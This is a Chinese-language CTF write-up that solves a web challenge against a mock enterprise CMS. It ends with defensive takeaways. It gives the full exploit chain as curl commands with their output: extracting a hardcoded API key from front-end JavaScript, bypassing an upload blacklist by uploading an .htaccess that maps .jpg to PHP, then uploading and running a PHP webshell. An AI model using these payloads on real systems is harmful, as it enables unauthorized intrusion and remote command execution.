## 题目原文

> 公司最近部署了一套全新的企业内容管理系统，据开发团队说已经做了严格的安全加固，只允许管理员登录后才能管理文件。你能绕过这些限制吗？

## 题解

### 入口与指纹

`Apache/2.4.66 (Debian)` + `PHP/8.2.30`，首页就是登录框（`Enterprise CMS v2.3.1 企业版`），页面脚注写着「安全加固版本」。

前端资源里有一个值得注意的版本参数：

```html
<script src="assets/js/app.js?v=2.3.1"></script>
```

### 关键观察

**1. 前端 JS 里硬编码了内部服务 API Key。**

`assets/js/app.js` 是未混淆的源码，里面有：

```js
apiBase: '/api',

// 开发环境API Key (内部服务使用)
if (endpoint.includes('upload')) {
    mergedOptions.headers['X-API-Key'] = 'cms_int_svc_k3y_9x2m7q';
}

uploadFile: function(file, onProgress) {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('api_key', 'cms_int_svc_k3y_9x2m7q');
    return fetch(this.apiBase + '/upload.php', { method: 'POST', body: formData });
}
```

上传端点、请求头名、以及 Key 的三份副本（JS 里两处、form 字段一处）全在客户端。**「只允许管理员登录」的检查在前端登录流程里，而这个接口只校验 API Key。**

**2. 上传接口只做后缀黑名单，且 `/uploads/` 允许覆盖 `.htaccess`。**

先直接传 `.php`：

```
{"error":"WAF: Dangerous file extension detected!"}
```

换一批变体测黑名单边界：

| 后缀 | 结果 |
| --- | --- |
| `php` / `phtml` / `pht` / `php5` / `phar` / `PHP` | 被拦 |
| `phps` / `php7` / `php8` / `inc` | 放行 |
| `php.jpg` / `php.png` / `phtml.jpg` | 放行（只看最后一段） |
| `php.`（尾随点） | 放行 |

放行不等于能执行：**所有上传文件都以静态文本返回，PHP 没有解析**。`/uploads/` 目录索引 403，说明目录本身存在但不能列。

**3. `.htaccess` 文件名没有被拦。**

`htaccess` 不在黑名单里，而 `/uploads/` 是 Apache 目录且允许 `AllowOverride`。上传一个：

```
AddType application/x-httpd-php .jpg
```

再把 `t_phpjpg.php.jpg` 请求一次，**PHP 开始解析**。

### 利用链

**Step 1：从 JS 拿 Key 和端点。**

```bash
T=10.0.0.0   # 本例地址已失效
KEY=$(curl -s "http://$T/assets/js/app.js?v=2.3.1" | grep -oE "cms_int_svc_[a-z0-9_]+" | head -1)
```

**Step 2：验证 Key 能绕过登录。**

```bash
curl -s -H "X-API-Key: $KEY" -F 'file=@a.txt' http://$T/api/upload.php
# {"success":true,...,"path":"uploads\/a.txt"}
```

不加 Key 时是 `403 {"error":"Invalid API key"}`。没有 session、没有 cookie，**登录流程被完全跳过**。

**Step 3：上传 `.htaccess`，把 `.jpg` 映射成 PHP。**

```bash
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
curl -s -H "X-API-Key: $KEY" -F 'file=@.htaccess;filename=.htaccess' -F "api_key=$KEY" \
  http://$T/api/upload.php
# {"success":true,...,"path":"uploads\/.htaccess"}
```

**Step 4：上传「图片后缀 + PHP 内容」的 webshell。**

```bash
printf '<?php echo "UP:"; system($_GET["c"]); ?>' > shell.php.jpg
curl -s -H "X-API-Key: $KEY" -F 'file=@shell.php.jpg' -F "api_key=$KEY" \
  http://$T/api/upload.php
# {"success":true,...,"path":"uploads\/shell.php.jpg"}
```

**Step 5：执行并读 flag。**

```bash
curl -s "http://$T/uploads/shell.php.jpg?c=id"
# UP:uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s "http://$T/uploads/shell.php.jpg?c=cat+/challenge/flag.txt"
# UP:flag{9d6c38f3-bcac-42c0-93c8-c748dcc919c2}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/challenge/flag.txt`，`.htaccess` + `.jpg` webshell 后读取 |

### 复盘

- **前端 JS 是源码，不是二进制。** 硬编码的 API Key、内部端点、调试开关都在里面；先 `curl` 一遍 `app.js` 再考虑爆破登录。
- **「只允许管理员登录」经常只覆盖 UI 流程。** 这个上传接口只校验 API Key，Key 又在前端，等于没有鉴权。
- **后缀黑名单不能只看「是否放行」。** 放行 `php7`/`phps`/`php.jpg` 但服务器不解析，等于零收益；先测一次上传后能不能执行，再决定要不要继续找绕过。
- **`.htaccess` 上传是最直接的重映射手段。** 只要目标目录允许 `AllowOverride` 且 WAF 不拦 `.htaccess`，`AddType` 一行就能把任意后缀变成 PHP。
- 侧重点错了会白花时间：本题的 flag 不在「登录绕过」的会话伪造上，而在「上传接口鉴权」上。
